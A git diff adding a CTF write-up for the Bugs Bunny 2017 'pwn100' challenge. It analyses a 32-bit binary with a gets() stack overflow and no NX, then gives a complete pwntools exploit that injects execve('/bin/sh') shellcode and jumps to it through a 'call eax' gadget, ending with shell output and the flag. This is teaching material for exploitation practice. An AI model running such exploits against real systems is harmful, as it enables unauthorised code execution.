@@ -1,118 +1,142 @@
+---
+title: pwn100
+category: bugs_bunny ctf 2k17
+author_member: muffinx
+show_comments: false
+---
 
+Binary type (file linux command):
 
-muffinx@muffinhouse:~/ctf/bugs_bunny_2017/pwn/pwn100$ file pwn100
+```
+file pwn100
 pwn100: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4eed8d04991f7b37ef1e309f1ecc983d7ff84333, not stripped
+```
 
+Binary security measurements (gdb-peda checksec):
 
+```
 gdb-peda$ checksec
 CANARY    : disabled
 FORTIFY   : disabled
 NX        : disabled
 PIE       : disabled
 RELRO     : Partial
+```
 
+The functionality is pretty straight forward:
 
+```cpp
+char *docopy()
+{
+  char s; // [sp+10h] [bp-18h]@1
 
-muffinx@muffinhouse:~/ctf/bugs_bunny_2017/pwn/pwn100$ ropgadget --binary pwn100
-Gadgets information
-============================================================
-0x080485bb : adc al, 0x41 ; ret
-0x080483bd : add al, 0x24 ; and byte ptr [eax - 0x2d00f7fc], ah ; leave ; ret
-0x08048380 : add al, 0x24 ; and byte ptr [eax - 0x2f00f7fc], ah ; leave ; ret
-0x080483e8 : add al, 8 ; add ecx, ecx ; ret
-0x08048384 : add al, 8 ; call eax
-0x080483c1 : add al, 8 ; call edx
-0x08048368 : add al, 8 ; cmp eax, 6 ; ja 0x8048377 ; ret
-0x0804843c : add byte ptr [eax], al ; add byte ptr [eax], al ; leave ; ret
-0x0804843d : add byte ptr [eax], al ; add cl, cl ; ret
-0x080482cc : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
-0x0804843e : add byte ptr [eax], al ; leave ; ret
-0x080485b8 : add cl, byte ptr [eax + 0xe] ; adc al, 0x41 ; ret
-0x0804843f : add cl, cl ; ret
-0x080485b4 : add eax, 0x2300e4e ; dec eax ; push cs ; adc al, 0x41 ; ret
-0x080483e5 : add eax, 0x804a020 ; add ecx, ecx ; ret
-0x080483a2 : add eax, edx ; sar eax, 1 ; jne 0x80483af ; ret
-0x080483ea : add ecx, ecx ; ret
-0x080484a9 : add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
-0x080482ce : add esp, 8 ; pop ebx ; ret
-0x0804840a : and al, 0x10 ; lahf ; add al, 8 ; call eax
-0x08048381 : and al, 0x20 ; mov al, byte ptr [0xd0ff0804] ; leave ; ret
-0x080483be : and al, 0x20 ; mov al, byte ptr [0xd2ff0804] ; leave ; ret
-0x08048428 : and al, 0xe8 ; ret 0xfffe
-0x080483ba : and al, 4 ; mov dword ptr [esp], 0x804a020 ; call edx
-0x080483bf : and byte ptr [eax - 0x2d00f7fc], ah ; leave ; ret
-0x08048382 : and byte ptr [eax - 0x2f00f7fc], ah ; leave ; ret
-0x080483e6 : and byte ptr [eax - 0x36fef7fc], ah ; ret
-0x08048366 : and byte ptr [eax - 0x77cf7fc], ah ; push es ; ja 0x8048379 ; ret
-0x080482b4 : call 0x8048356
-0x0804855b : call dword ptr [ebx]
-0x0804857b : call dword ptr [edx]
+  return gets(&s);
+}
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  docopy();
+  return 0;
+}
+```
+
+So just a basic stack overflow.
+The only function available to us is gets().
+Looking at the segments there is no wx(write/execute) segment which could be used to copy data to with gets.
+
+```
+.init         080482B0 080482D3 R . X . L dword 0001 public CODE  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
+.plt          080482E0 08048320 R . X . L para  0002 public CODE  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
+.text         08048320 080484C2 R . X . L para  0003 public CODE  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
+.fini         080484C4 080484D8 R . X . L dword 0004 public CODE  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
+.rodata       080484D8 080484E0 R . . . L dword 0005 public CONST 32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
+.eh_frame_hdr 080484E0 08048514 R . . . L dword 0006 public CONST 32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
+.eh_frame     08048514 080485E4 R . . . L dword 0007 public CONST 32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
+.init_array   08049F08 08049F0C R W . . L dword 0008 public DATA  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
+.fini_array   08049F0C 08049F10 R W . . L dword 0009 public DATA  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
+.jcr          08049F10 08049F14 R W . . L dword 000A public DATA  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
+.got          08049FFC 0804A000 R W . . L dword 000B public DATA  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
+.got.plt      0804A000 0804A018 R W . . L dword 000C public DATA  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
+.data         0804A018 0804A020 R W . . L dword 000D public DATA  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
+.bss          0804A020 0804A024 R W . . L byte  000E public BSS   32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
+extern        0804A024 0804A044 ? ? ? . L para  000F public       32 FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF
+```
+
+So we have to execute our shellcode on the stack, which is actually possible since no NX is activated. So let's use some rop to jump into the stack.
+
+When we look at the registers before the ret, we can see that eax actually points to our input.
+
+```
+EAX: 0xffffd470 ('A' <repeats 12 times>, "a")
+EBX: 0xf7fa3000 --> 0x16fda8
+ECX: 0xfbad2288
+EDX: 0xf7fa4864 --> 0x0
+ESI: 0x0
+EDI: 0x0
+EBP: 0xffffd488 --> 0xffffd498 --> 0x0
+ESP: 0xffffd460 --> 0xffffd470 ('A' <repeats 12 times>, "a")
+EIP: 0x804842e (<docopy+17>:	leave)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048423 <docopy+6>:	lea    eax,[ebp-0x18]
+   0x8048426 <docopy+9>:	mov    DWORD PTR [esp],eax
+   0x8048429 <docopy+12>:	call   0x80482f0 <gets@plt>
+=> 0x804842e <docopy+17>:	leave  
+```
+
+I found a ropgadget with that we can jump into our placed shellcode:
+
+```
+ropgadget --binary pwn100
 0x08048386 : call eax
-0x080483c3 : call edx
-0x080483a5 : clc ; jne 0x80483ac ; ret
-0x0804836b : clc ; push es ; ja 0x8048374 ; ret
-0x0804836a : cmp eax, 6 ; ja 0x8048375 ; ret
-0x080485b9 : dec eax ; push cs ; adc al, 0x41 ; ret
-0x0804842d : dec ecx ; ret
-0x080485b5 : dec esi ; push cs ; xor byte ptr [edx], al ; dec eax ; push cs ; adc al, 0x41 ; ret
-0x080484a8 : fild word ptr [ebx + 0x5e5b1cc4] ; pop edi ; pop ebp ; ret
-0x08048421 : in al, dx ; sub byte ptr [ebp + 0x489e845], cl ; and al, 0xe8 ; ret 0xfffe
-0x080485bc : inc ecx ; ret
-0x0804836d : ja 0x8048372 ; ret
-0x080483a6 : jne 0x80483ab ; ret
-0x080484a7 : jne 0x8048491 ; add esp, 0x1c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
-0x0804840c : lahf ; add al, 8 ; call eax
-0x08048388 : leave ; ret
-0x080484aa : les ebx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
-0x080482cf : les ecx, ptr [eax] ; pop ebx ; ret
-0x080483e7 : mov al, byte ptr [0xc9010804] ; ret
-0x08048383 : mov al, byte ptr [0xd0ff0804] ; leave ; ret
-0x080483c0 : mov al, byte ptr [0xd2ff0804] ; leave ; ret
-0x08048367 : mov al, byte ptr [0xf8830804] ; push es ; ja 0x8048378 ; ret
-0x080483e4 : mov byte ptr [0x804a020], 1 ; leave ; ret
-0x08048408 : mov dword ptr [esp], 0x8049f10 ; call eax
-0x0804837f : mov dword ptr [esp], 0x804a020 ; call eax
-0x080483bc : mov dword ptr [esp], 0x804a020 ; call edx
-0x0804843b : mov eax, 0 ; leave ; ret
-0x08048350 : mov ebx, dword ptr [esp] ; ret
-0x0804834f : nop ; mov ebx, dword ptr [esp] ; ret
-0x0804834d : nop ; nop ; mov ebx, dword ptr [esp] ; ret
-0x0804834b : nop ; nop ; nop ; mov ebx, dword ptr [esp] ; ret
-0x080484b8 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; ret
-0x080484b9 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; ret
-0x080484ba : nop ; nop ; nop ; nop ; nop ; nop ; ret
-0x080484bb : nop ; nop ; nop ; nop ; nop ; ret
-0x080484bc : nop ; nop ; nop ; nop ; ret
-0x080484bd : nop ; nop ; nop ; ret
-0x080484be : nop ; nop ; ret
-0x080484bf : nop ; ret
-0x08048385 : or bh, bh ; ror cl, 1 ; ret
-0x080483c2 : or bh, bh ; ror cl, cl ; ret
-0x08048369 : or byte ptr [ebx + 0x17706f8], al ; ret
-0x080483e9 : or byte ptr [ecx], al ; leave ; ret
-0x080483a1 : pop ds ; add eax, edx ; sar eax, 1 ; jne 0x80483b0 ; ret
-0x080484af : pop ebp ; ret
-0x080484ac : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
-0x080482d1 : pop ebx ; ret
-0x080484ae : pop edi ; pop ebp ; ret
-0x080484ad : pop esi ; pop edi ; pop ebp ; ret
-0x080485ba : push cs ; adc al, 0x41 ; ret
-0x080485b6 : push cs ; xor byte ptr [edx], al ; dec eax ; push cs ; adc al, 0x41 ; ret
-0x08048455 : push ebx ; call 0x8048357
-0x0804836c : push es ; ja 0x8048373 ; ret
-0x08048454 : push esi ; push ebx ; call 0x8048358
-0x080483a3 : rcl cl, 1 ; clc ; jne 0x80483ae ; ret
-0x080482ba : ret
-0x0804839e : ret 0xeac1
-0x0804842a : ret 0xfffe
-0x08048387 : ror cl, 1 ; ret
-0x080483c4 : ror cl, cl ; ret
-0x080483a4 : sar eax, 1 ; jne 0x80483ad ; ret
-0x08048351 : sbb al, 0x24 ; ret
-0x080484ab : sbb al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
-0x0804839f : shr edx, 0x1f ; add eax, edx ; sar eax, 1 ; jne 0x80483b2 ; ret
-0x08048422 : sub byte ptr [ebp + 0x489e845], cl ; and al, 0xe8 ; ret 0xfffe
-0x080482b1 : sub esp, 8 ; call 0x8048359
-0x080482ca : xor al, byte ptr [eax] ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
-0x080485b7 : xor byte ptr [edx], al ; dec eax ; push cs ; adc al, 0x41 ; ret
-0x080484cf : xor ebx, dword ptr [ebx] ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
+```
+
+Resulting in this exploit:
+
+
+```python
+#!/usr/bin/env python
+
+from pwn import *
+context(arch = 'i386', os = 'linux')
+
+#r = process('./pwn100')
+r = remote('54.153.19.139', 5252)
+
+#gdb.attach(r, '''
+#set follow-fork-mode child
+#break *0x0804842F
+#continue
+#''')
+
+payload = asm('xor eax,eax')
+payload += asm('xor ecx,ecx')
+payload += asm('xor edx,edx')
+payload += asm('xor esi,esi')
+payload += asm('mov eax,0x0b')
+payload += asm('lea ebx,[esp-8]')
+payload += asm('int 0x80')
+payload += '/bin/sh\x00'
+
+payload = ('\x90' * (28-len(payload))) + payload
+payload += p32(0x08048386) # call EAX
+
+
+r.sendline(payload)
+r.interactive()
+```
+
+As you can see I used the shellcoding features of pwntools to build a working shellcode.
+The "/bin/sh" string is at the end of the shellcode and the string pointer to it will be put
+into ebx by using:
+
+```
+lea ebx,[esp-8]
+```
+
+Finally we got a shell:
+
+```
+$ cat /home/pwn100/flag
+Bugs_Bunny{ohhhh_you_look_you_are_gooD_hacker_Maybe_Iknow_you:p}
+```
